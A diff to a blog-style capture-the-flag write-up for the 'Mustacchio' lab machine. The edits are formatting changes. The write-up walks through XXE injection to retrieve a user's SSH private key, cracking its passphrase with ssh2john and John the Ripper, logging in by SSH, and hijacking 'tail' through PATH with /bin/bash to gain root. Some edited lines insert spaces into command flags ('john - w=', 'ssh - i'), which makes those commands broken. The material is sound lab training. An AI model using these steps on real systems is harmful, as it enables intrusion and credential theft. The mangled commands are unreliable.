@@ -20,7 +20,7 @@ comments: false
 ## Our scan shows:
 {% highlight bash %}
 /robots.txt and /custom
-> {% endhighlight bash %}
+{% endhighlight bash %}
 ************PIC
 <br>
 {% highlight bash %}
@@ -33,7 +33,7 @@ comments: false
 ************PIC
 <br>
 ## /custom/js shows users backup file
-We will use strings to read the file
+## We will use strings to read the file
 ## strings shows:
 ************PIC
 
@@ -68,7 +68,7 @@ Lets go back and see what we missed...
 {% highlight bash %}
 1. username: Barry
 2. ssh is allowed with the correct key
-3. there is a directory /auth/dontforget.bak
+3. another directory: /auth/dontforget.bak
 {% endhighlight bash %}
 ************PIC
 <br>
@@ -83,13 +83,12 @@ Lets go back and see what we missed...
   < name>10DNC</name>
   < author>10DNC</author>
   < com>hacked</com>
-</comment> "
+</comment> 
 {% endhighlight bash %}
-<br>
 <br>
 ## It looks like this is vulnerable to a XXE injection
 ## Let's check out example exploits found below:
-## [Injection#classic-xxe](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe)
+## [github.com/swisskyrepo/....Injection#classic-xxe](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe)
 <br>
 ## Let's modify and test the basic blind XXE vulnerability:
 {% highlight bash %}
@@ -118,6 +117,7 @@ Lets go back and see what we missed...
 ************PIC
 -----------------
 ## We now get the ssh id_rsa key for barry
+<br>
 ## We can save this to text file:
 {% highlight bash %}
 $ nano id_rsa
@@ -132,11 +132,11 @@ $ ssh2john id_rsa > hash
 {% endhighlight bash %}
 ## Then use JTR to crack hash:
 {% highlight bash %}
-$ john -w=/usr/share/wordlists/rockyou.txt mustacchio_hash
+$ john - w=/usr/share/wordlists/rockyou.txt mustacchio_hash
 {% endhighlight bash %}
 ## Now we can login with ssh using our new credentials:
 {% highlight bash %}
-$ ssh -i id_rsa barry@target_IP
+$ ssh - i id_rsa barry@target_IP
 password: uriel james
 {% endhighlight bash %}
 <br>
@@ -164,7 +164,7 @@ password: uriel james
 {% highlight bash %}
 echo "/bin/bash" > tail
 {% endhighlight bash %}
-<br>
+
 ## run the live_log:
 {% highlight bash %}
 /home/joe/live_log
